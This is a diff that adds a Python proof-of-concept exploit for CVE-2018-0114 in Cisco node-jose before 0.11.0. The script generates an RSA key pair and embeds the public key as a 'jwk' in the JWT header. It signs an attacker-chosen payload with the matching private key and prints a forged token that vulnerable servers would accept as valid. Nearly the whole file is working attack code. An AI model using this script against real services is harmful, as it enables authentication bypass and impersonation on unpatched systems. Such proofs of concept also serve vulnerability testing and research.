@@ -1,0 +1,88 @@
+import base64
+import urllib
+import rsa
+import sys
+
+#zi0Black
+
+'''
+POC of CVE-2018-0114 Cisco node-jose <0.11.0
+
+Created by Andrea Cappa aka @zi0Black (GitHub,Twitter,Telegram)
+
+Mail: a.cappa@zioblack.xyz
+Site: https://zioblack.xyz
+
+A special thanks to Louis Nyffenegger, the founder of PentesterLab, for all the help he provided to allow me to write this script.
+
+Mail: louis@pentesterlab.com
+Site: https://pentesterlab.com
+
+'''
+
+def generate_key (key_size):
+    #create rsa priv & public key
+    print ("[+]Creating-RSA-pair-key")
+    (public_key,private_key)=rsa.newkeys(key_size,poolsize=8)
+    print ("\t[+]Pair-key-created")
+    return private_key, public_key
+
+def to_bytes(n, length, endianess='big'):
+    h = '%x' % n
+    s = ('0'*(len(h) % 2) + h).zfill(length*2).decode('hex')
+    return s if endianess == 'big' else s[::-1]
+
+def generate_header_payload(payload,pubkey):
+    #create header and payload
+    print ("[+]Assembling-the-header-and-the-payload")
+    xn = pubkey.n
+    xe = pubkey.e
+    n=base64.urlsafe_b64encode(to_bytes(xn,sys.getsizeof(xn),'big'))
+    e=base64.urlsafe_b64encode(to_bytes(xe,sys.getsizeof(xe),'big'))
+    headerAndPayload = base64.b64encode('{"alg":"RS256",'
+                                        '"jwk":{"kty":"RSA",'
+                                        '"kid":"topo.gigio@hackerzzzz.own",'
+                                        '"use":"sig",'
+                                        '"n":"'+n+'",'
+                                        '"e":"'+e+'"}}')
+    headerAndPayload=headerAndPayload+"."+base64.b64encode(payload)
+    headerAndPayload = headerAndPayload.encode('utf-8').replace("=","")
+    print ("\t[+]Assembed")
+    return headerAndPayload
+
+def generate_signature (firstpart,privkey):
+    #create signature
+    signature = rsa.sign(firstpart,privkey,'SHA-256')
+    signatureEnc = base64.b64encode(signature).encode('utf-8').replace("=", "")
+    print ("[+]Signature-created")
+    return signatureEnc
+
+def create_token(headerAndPayload,sign):
+    print ("[+]Forging-of-the-token\n\n")
+    token = headerAndPayload+"."+sign
+    token = urllib.quote_plus(token)
+    return token
+
+
+if(len(sys.argv)>0):
+    payload = str(sys.argv[1])
+    key_size = sys.argv[2]
+else:
+    payload = 'somthings'
+
+banner="""
+   _____  __      __  ______            ___     ___    __    ___              ___    __   __   _  _   
+  / ____| \ \    / / |  ____|          |__ \   / _ \  /_ |  / _ \            / _ \  /_ | /_ | | || |                    
+ | |       \ \  / /  | |__     ______     ) | | | | |  | | | (_) |  ______  | | | |  | |  | | | || |_ 
+ | |        \ \/ /   |  __|   |______|   / /  | | | |  | |  > _ <  |______| | | | |  | |  | | |__   _|
+ | |____     \  /    | |____            / /_  | |_| |  | | | (_) |          | |_| |  | |  | |    | |  
+  \_____|     \/     |______|          |____|  \___/   |_|  \___/            \___/   |_|  |_|    |_|    by @zi0Black    
+"""
+
+if __name__ == '__main__':
+    print (banner)
+    (privatekey,publickey) = generate_key(key_size)
+    firstPart = generate_header_payload(payload,publickey)
+    signature = generate_signature(firstPart,privatekey)
+    token = create_token(firstPart,signature)
+    print(token)
